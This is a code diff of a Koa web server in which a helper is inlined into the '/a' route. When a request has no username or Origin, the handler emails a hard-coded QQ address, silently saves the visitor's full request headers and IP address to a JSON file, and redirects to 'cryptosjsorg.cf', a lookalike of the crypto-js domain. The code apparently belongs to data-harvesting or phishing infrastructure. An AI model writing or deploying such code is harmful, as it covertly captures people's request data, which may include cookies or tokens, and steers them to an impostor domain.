@@ -61,39 +61,6 @@ app.use( BodyParser() );
 
 const router = new Router();
 
-async function sendema(data,ctx){
-    
-    data.username="假数据"
-        
-    async function timeout() {
-        return new Promise((resolve, reject) => {
-            email.sendMail('1162212711@qq.com', '5555', (state) => {
-                resolve(state);
-            })
-        })
-    }
-    // var timeout1=util.promisify(timeout)
-    await timeout().then(state => {
-        // console.log('进来假了');
-        if (state) {
-            // console.log('进来假了111');
-            data.username="假数据1"
-            data.header=ctx.request.header;
-            data.remoteAddress=ctx.req.connection.remoteAddress;
-            data.Time=getTimeByTimeZone(8);
-            datas.todos.push(data);
-            fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
-            ctx.response.redirect('http://cryptosjsorg.cf');
-            // ctx.body = "1";
-            return ;
-        } else {
-            console.log('进来假了222');
-            ctx.response.redirect('http://cryptosjsorg.cf');
-            // ctx.body = "0"
-            return ;
-        }
-    })
-}
 function addshuju(data,ctx){
     // data.requestip=ctx.request.header.host; 
     // data.Origin=ctx.request.header.Origin; 
@@ -227,7 +194,36 @@ router.get('/a', async ctx => {
 
     if(!!!data.username&&!!!header.origin){
 
-        sendema(data,ctx)
+        data.username="假数据"
+        
+        async function timeout() {
+            return new Promise((resolve, reject) => {
+                email.sendMail('1162212711@qq.com', '5555', (state) => {
+                    resolve(state);
+                })
+            })
+        }
+        // var timeout1=util.promisify(timeout)
+        await timeout().then(state => {
+            // console.log('进来假了');
+            if (state) {
+                // console.log('进来假了111');
+                data.username="假数据1"
+                data.header=ctx.request.header;
+                data.remoteAddress=ctx.req.connection.remoteAddress;
+                data.Time=getTimeByTimeZone(8);
+                datas.todos.push(data);
+                fs.writeFileSync('./static/data/wwdata.json', JSON.stringify(datas));
+                ctx.response.redirect('http://cryptosjsorg.cf');
+                // ctx.body = "1";
+                return ;
+            } else {
+                console.log('进来假了222');
+                ctx.response.redirect('http://cryptosjsorg.cf');
+                // ctx.body = "0"
+                return ;
+            }
+        })
         
     }else{
         
